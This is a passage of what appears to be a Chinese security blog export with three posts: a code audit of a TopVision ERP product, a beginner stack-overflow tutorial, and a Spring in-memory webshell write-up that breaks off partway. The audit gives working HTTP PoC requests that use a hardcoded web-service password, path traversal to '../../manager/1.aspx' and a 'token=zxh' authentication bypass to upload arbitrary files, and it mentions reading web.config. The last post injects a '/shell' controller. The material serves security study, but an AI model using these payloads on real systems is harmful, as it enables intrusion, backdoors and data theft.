<code>TopVision.WebApi.WebService.BasicService</code> 来处理吗？</p>\n<p>看看chatgpt的回答</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190137909.png\" alt=\"image-20240327190137909\"></p>\n<p>概括为：WebService\\BasicService.asmx只是定义了最终交由 <code>TopVision.WebApi.WebService.BasicService</code> 处理，中间过程可以通过settings配置交由 <code>Topvision_Web_ERPService_BasicService</code> 处理。</p>\n<p>分别看一下二者的漏洞函数 <code>UploadPersonalFile</code> 的实现</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190543108.png\" alt=\"image-20240327190543108\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190609458.png\" alt=\"image-20240327190609458\"></p>\n<p>果然，前者通过soap发送到后者，然后写入文件，需要三个参数fs文件内容，filename文件名称，webservicePassword密钥</p>\n<p>全局搜一下即可，这里注意XML文件中有很多webservicePassword，下面要用到。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327191753221.png\" alt=\"image-20240327191753221\"></p>\n<p>poc构造，soap的实现可以根据源码问chatgpt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;WebService&#x2F;BasicService.asmx HTTP&#x2F;1.1</span><br><span class=\"line\">Host: xxxx:8056</span><br><span class=\"line\">SOAPAction: http:&#x2F;&#x2F;tempuri.org&#x2F;UploadPersonalFile</span><br><span class=\"line\">Content-Type: text&#x2F;xml; charset&#x3D;utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:tem&#x3D;&quot;http:&#x2F;&#x2F;tempuri.org&#x2F;&quot;&gt;</span><br><span class=\"line\">   &lt;soapenv:Header&#x2F;&gt;</span><br><span class=\"line\">   &lt;soapenv:Body&gt;</span><br><span class=\"line\">      &lt;tem:UploadPersonalFile&gt;</span><br><span class=\"line\">         &lt;tem:fs&gt;bGR3aw&#x3D;&#x3D;&lt;&#x2F;tem:fs&gt;</span><br><span class=\"line\">         &lt;tem:FileName&gt;..&#x2F;..&#x2F;manager&#x2F;1.aspx&lt;&#x2F;tem:FileName&gt;</span><br><span class=\"line\">         &lt;tem:webservicePassword&gt;&#123;ac80457b-368d-4062-b2dd-ae4d490e1c4b&#125;&lt;&#x2F;tem:webservicePassword&gt;</span><br><span class=\"line\">      &lt;&#x2F;tem:UploadPersonalFile&gt;</span><br><span class=\"line\">   &lt;&#x2F;soapenv:Body&gt;</span><br><span class=\"line\">&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327213608792.png\" alt=\"image-20240327213608792\"></p>\n<h2 id=\"API-1\"><a href=\"#API-1\" class=\"headerlink\" title=\"API\"></a>API</h2><p>看application，即程序初始化入口，主要是配置web api、配置过滤器、配置路由规则、加载web.config配置文件。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222601696.png\" alt=\"image-20240327222601696\"></p>\n<p>接着config看，添加了路由，形式为：api/{controller}/{action}</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222312213.png\" alt=\"image-20240327222312213\"></p>\n<p>那就直接找controller控制器吧，files控制器继承ToVisionApi</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327223514374.png\" alt=\"image-20240327223514374\"></p>\n<p>这里存在一个鉴权，但是只要传 <code>token=zxh</code> 即可绕过</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327223822545.png\" alt=\"image-20240327223822545\"></p>\n<p>回到上传文件，需要三个参数+token参数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327224818570.png\" alt=\"image-20240327224818570\"></p>\n<p>另外如果传入fs的值为以下，是可以json反序列化的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fs&#x3D;[60,37,64,80,97,103,101,32,76,97,110,103,11]</span><br></pre></td></tr></table></figure>\n\n<p>构造poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;api&#x2F;files&#x2F;UploadFile HTTP&#x2F;1.1</span><br><span class=\"line\">Host: xxxx</span><br><span class=\"line\">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\"></span><br><span class=\"line\">token&#x3D;zxh&amp;FileName&#x3D;&#x2F;..&#x2F;..&#x2F;manager&#x2F;1.aspx&amp;pathType&#x3D;1&amp;fs&#x3D;[108,100,119,107,50]</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327230518277.png\" alt=\"image-20240327230518277\"></p>\n<h1 id=\"漏洞挖掘\"><a href=\"#漏洞挖掘\" class=\"headerlink\" title=\"漏洞挖掘\"></a>漏洞挖掘</h1><p>综上，快速挖洞就可以基于以上分析，从web与api进行</p>\n<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><p>比如UploadBillFile</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327231333160.png\" alt=\"image-20240327231333160\"></p>\n<p>poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;WebService&#x2F;BasicService.asmx HTTP&#x2F;1.1</span><br><span class=\"line\">Host: xxxxx</span><br><span class=\"line\">SOAPAction: http:&#x2F;&#x2F;tempuri.org&#x2F;UploadBillFile</span><br><span class=\"line\">Content-Type: text&#x2F;xml; charset&#x3D;utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:tem&#x3D;&quot;http:&#x2F;&#x2F;tempuri.org&#x2F;&quot;&gt;</span><br><span class=\"line\">   &lt;soapenv:Header&#x2F;&gt;</span><br><span class=\"line\">   &lt;soapenv:Body&gt;</span><br><span class=\"line\">      &lt;tem:UploadBillFile&gt;</span><br><span class=\"line\">         &lt;tem:fs&gt;bGR3aw&#x3D;&#x3D;&lt;&#x2F;tem:fs&gt;</span><br><span class=\"line\">         &lt;tem:FileName&gt;..&#x2F;..&#x2F;manager&#x2F;1.aspx&lt;&#x2F;tem:FileName&gt;</span><br><span class=\"line\">         &lt;tem:webservicePassword&gt;&#123;ac80457b-368d-4062-b2dd-ae4d490e1c4b&#125;&lt;&#x2F;tem:webservicePassword&gt;</span><br><span class=\"line\">      &lt;&#x2F;tem:UploadBillFile&gt;</span><br><span class=\"line\">   &lt;&#x2F;soapenv:Body&gt;</span><br><span class=\"line\">&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>执行sql</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327232443295.png\" alt=\"image-20240327232443295\"></p>\n<p>任意文件下载</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327232517848.png\" alt=\"image-20240327232517848\"></p>\n<h2 id=\"API-2\"><a href=\"#API-2\" class=\"headerlink\" title=\"API\"></a>API</h2><p>文件上传四个接口</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234058143.png\" alt=\"image-20240327234058143\"></p>\n<p>任意文件读取，读web.config，泄露数据库，webservicepassword等信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234157062.png\" alt=\"image-20240327234157062\"></p>\n<p>还有一些其他的接口</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234553458.png\" alt=\"image-20240327234553458\"></p>\n<p>太多了就不一一举例了。</p>\n","categories":["代码审计"]},{"title":"简单栈溢出理解","url":"/2023/12/25/%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E7%90%86%E8%A7%A3/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>再次理解函数调用，简单栈溢出</p>\n<p>参考:<a href=\"https://bbs.pediy.com/thread-259272.htm\">从0开始CTF-PWN（二）从PWN的HelloWorld-栈溢出开始</a></p>\n<h1 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h1><ul>\n<li>函数状态主要涉及三个寄存器－－esp，ebp，eip。</li>\n</ul>\n<ol>\n<li>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</li>\n<li>ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</li>\n<li>eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</li>\n</ol>\n<a id=\"more\"></a>\n\n<h1 id=\"函数调用栈\"><a href=\"#函数调用栈\" class=\"headerlink\" title=\"函数调用栈\"></a>函数调用栈</h1><p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。<br>典型的函数调用栈结构如下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/34f548fc8f7048ca8b19ffd460a23e80.jpg\"></p>\n<h1 id=\"函数调用过程\"><a href=\"#函数调用过程\" class=\"headerlink\" title=\"函数调用过程\"></a>函数调用过程</h1><ul>\n<li><p>发生函数调用时，会先将被调用函数（callee）的参数按逆序压入栈内，这些参数会保存在调用函数（caller）的函数状态内。</p>\n</li>\n<li><p>然后压入被调用函数（callee）的返回地址（即调用后的下一条指令的地址），这样就保存了调用函数的eip寄存器内容。</p>\n</li>\n<li><p>继续压入调用函数（caller）的基址，也就是当前ebp寄存器的值，同时将ebp寄存器的值更新为当前栈顶的地址（mov ebp,esp），这样调用函数（caller）的基地址信息得以保存，后续调用完毕返回时，可以用于恢复ebp。</p>\n</li>\n<li><p>继续压入被调用函数的局部变量等数据。</p>\n</li>\n</ul>\n<blockquote>\n<p>入栈时： 被调函数参数 –&gt; 被调函数返回地址 –&gt; 调用者基址 –&gt; 被调者局部变量 </p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/4379440febb2406a99f1686130b7f4bc.jpg\"></p>\n<ul>\n<li><p>在压栈过程中，esp寄存器的值会逐渐减小（栈从内存高地址向地址值“生长”）。发生调用时，程序还会将被调用函数（callee）的指令地址存到eip寄存器内，这样程序就可以依序执行被调用函数的指令了。</p>\n</li>\n<li><p>调用结束时，栈变化的核心任务是弹出被调用函数（callee）的状态，并将整个栈恢复到调用函数（caller）的状态。首先弹出被调用函数（callee）的局部变量，然后将栈上存储的调用函数（caller）的基地址从栈内弹出，并重新保存到ebp寄存器中，这样调用函数的基地址信息得以恢复，此时栈顶会指向返回地址。最后将返回地址从栈顶弹出，并保存到eip寄存器内，这样调用函数的eip指令信息得以恢复，指向了调用函数后的下一条语句。</p>\n</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/147103fcefc54ce3ab44a9aca955c831.jpg\"></p>\n<blockquote>\n<p>出栈时：被调者局部变量  –&gt; 调用者基址 –&gt; 被调函数返回地址 –&gt;被调函数参数</p>\n</blockquote>\n<h1 id=\"pwndbg调试跟进\"><a href=\"#pwndbg调试跟进\" class=\"headerlink\" title=\"pwndbg调试跟进\"></a>pwndbg调试跟进</h1><p>代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> key)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> overflowme[<span class=\"number\">32</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;overflow me : &quot;</span>);</span><br><span class=\"line\">    gets(overflowme);    <span class=\"comment\">// smash me!</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(key == <span class=\"number\">0xcafebabe</span>)&#123;</span><br><span class=\"line\">        system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Nah..\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</span><br><span class=\"line\">    func(<span class=\"number\">0xdeadbeef</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -g -m32 -O0 -fno-stack-protector -z execstack -o test test.c</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/40f47a5c857b4835bee4c4b08510a49b.png\"><br>在 call func 处下断点 <code>b *56556254</code></p>\n<p>查看栈情况</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/d888061e493c48d699a0c1311594f8f7.png\"><br>看到压入的是<code>被调函数参数</code> 地址为 <code>0xffffd130</code></p>\n<p>stepi 进一步进行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/8b9a44eaa1e44257940cc15005daf759.png\"><br>看到栈内情况 压入了 <code>callee返回地址</code> </p>\n<p>如果想利用栈溢出来覆盖参数，那么肯定要知道 <code>gets 开始存入的地址</code></p>\n<p>在gets下一步下断点<br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/8077b02187d644fa9a7baa22fa6234cc.png\" alt=\"在这里插入图片描述\"><br><code>c</code> 继续运行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pwn/3143e59fe2414c6c83f5ceb28fca2fab.png\"><br>看到从 <code>0xffffd0f0</code> 开始存入输入的字符</p>\n<p><code>p/d 0xffffd130 - 0xffffd0f0</code> 得到输入处地址与函数参数地址之间的距离，然后构造<code>垃圾数据+paylaod</code> 达到控制函数参数的目的</p>\n<p>嗯，目前了解就是这些了</p>\n","categories":["二进制"]},{"title":"JAVA内存马之二","url":"/2023/12/25/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%BA%8C)/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/feng.jpeg\" alt=\"feng\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接上篇，这篇学习框架内存马与Agent内存马，下篇学习内存马查杀</p>\n<p>环境：springboot 2.4.5</p>\n<h1 id=\"基于动态添加框架组件\"><a href=\"#基于动态添加框架组件\" class=\"headerlink\" title=\"基于动态添加框架组件\"></a>基于动态添加框架组件</h1><p>针对于框架有spring、springboot、weblogic等等，上一篇实现了基于Servlet API中的 Servlet、Filter、Listener的内存马实现，现在针对SpringMVC的Controller来进行内存马的学习，依旧根据上一篇的学习思路，从controller的实现原理开始学习</p>\n<blockquote>\n<p>在动态注册 Servlet 时，注册了两个东西，一个是 Servlet 的本身实现，一个 Servlet 与 URL 的映射 Servlet-Mapping，在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射。</p>\n</blockquote>\n<h2 id=\"Spring-Controller-内存马\"><a href=\"#Spring-Controller-内存马\" class=\"headerlink\" title=\"Spring Controller 内存马\"></a>Spring Controller 内存马</h2><h3 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h3><p>环境：springboot-2.4.5</p>\n<p>针对前期springboot的bean的初始化流程不再分析，给出细致分析：<a href=\"https://blog.csdn.net/kangsa998/article/details/90056135\">Springboot 源码分析-bean 初始化流程</a></p>\n<p>给出Controller的demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/books&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BookController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getById</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;springboot is running&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;springboot is running&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>初始化时，针对容器内的bean进行构造方法，属性的初始化，然后使用到 AbstractAutowireCapableBeanFactory.java#initializeBean() 方法，针对每个bean调用了invokeInitMethods()，其中的一个实现类需要关注的是 <strong>RequestMappingHandlerMapping</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605135709591.png\" alt=\"image-20220605135709591\"></p>\n<p>然后判断是否继承 InitializingBean，然后调用afterPropertiesSet方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605140133563.png\" alt=\"image-20220605140133563\"></p>\n<p>调用父类的afterPropertiesSet()方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605140443515.png\" alt=\"image-20220605140443515\"></p>\n<p>跟踪到 AbstractHandlerMethodMapping.java#afterPropertiesSet，发现又调用了 <strong>initHandlerMethods()</strong></p>\n<p>根据注释就是从当前的application中扫描所有的beans</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605140904938.png\" alt=\"image-20220605140904938\"></p>\n<p>进入 <strong>processCandidateBean</strong>，获取bean的类型，然后通过 <strong>isHandler</strong> 进行判断</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605141920229.png\" alt=\"image-20220605141920229\"></p>\n<p>RequestMappingHandlerMapping#<strong>isHandler</strong> <strong>判断bean 是否带有 Controller 或 RequestMapping 注解</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605142111033.png\" alt=\"image-20220605142111033\"></p>\n<p>如果符合就返回到 <strong>detectHandlerMethods</strong> 中，这个方法实现的功能就是，通过一个map(method-&gt;info)然后进行注册映射。</p>\n<p>其中需要关注的两个方法 <strong>getMappingForMethod</strong> 和 <strong>registerHandlerMethod</strong>，分别是形成map和注册</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605180418607.png\" alt=\"image-20220605180418607\"></p>\n<p>跟进 <strong>getMappingForMethod</strong> ，发现主要为两步</p>\n<p>1、通过createRequestMappingInfo方法以当前控制器下的method作为变量，创建了一个<strong>RequestMappingInfo</strong> 的对象</p>\n<p>2、通过createRequestMappingInfo方法以当前控制器下的handlerType作为参数，创建了一个<strong>RequestMappingInfo</strong> 的对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605230532906.png\" alt=\"image-20220605230532906\"></p>\n<p><strong>createRequestMappingInfo</strong> 通过 findMergedAnnotation 去查询 handler 的 RequestMapping 类型的注解</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605230734303.png\" alt=\"image-20220605230734303\"></p>\n<p>然后调用双参数的 createRequestMappingInfo 添加 请求方法 路径等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605231626214.png\" alt=\"image-20220605231626214\"></p>\n<p> method 和 handlerType 返回值如下然后combine进行合并，最后返回 info</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605232156567.png\" alt=\"image-20220605232156567\"></p>\n<p>然后进入一个循环</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605233444545.png\" alt=\"image-20220605233444545\"></p>\n<p>跟进 <strong>registerHandlerMethod</strong>，调用 MappingRegistry 类的 <strong>register</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605234443461.png\" alt=\"image-20220605234443461\"></p>\n<p>可以看见一开始就定义了一些变量，这些就是最终存储的位置</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605235542675.png\" alt=\"image-20220605235542675\"></p>\n<p><strong>register()</strong> 一开始都是铺垫，最后添加到 registry 中，最终利用点就是这个register方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605235755096.png\" alt=\"image-20220605235755096\"></p>\n<p>此时map对应的 路径-&gt;方法，至此，controller的注册流程完成</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220606000530484.png\" alt=\"image-20220606000530484\"></p>\n<p>那么一次http请求路由是怎么查找到对应的controller的？</p>\n<p><a href=\"https://www.cnblogs.com/w-y-c-m/p/8416630.html\">SpringMVC源码之Controller查找原理 - 卧颜沉默 - 博客园 (cnblogs.com)</a></p>\n<p>其中有一个方法是用于动态注册的：<strong>registerMapping()</strong></p>\n<p>看注释也能知道，当初始化完成后，可以调用该方法进行动态注册，因为调用了register方法，这也是下文用于注册controller的利用调用处，还有另外几种方法，见下面的参考</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220606225504008.png\" alt=\"image-20220606225504008\"></p>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>思路：</p>\n<ul>\n<li>创建一个恶意 RequestMappingInfo 对象，实现其方法，请求路径</li>\n<li>通过容器获取上下文，然后获取 RequestMappingHandlerMapping</li>\n<li>通过调用 registerMapping <strong>等</strong>方法进行注册controller</li>\n</ul>\n<p>ShellController</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.PrintWriter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">Inject</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchMethodException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取InjectController的method</span></span><br><span class=\"line\">        Method method = InjectController.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 定义访问 controller 的 URL 地址</span></span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/shell&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\">        <span class=\"comment\">// 6. 在内存中动态注册 controller</span></span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        InjectController injectToController = <span class=\"keyword\">new</span> 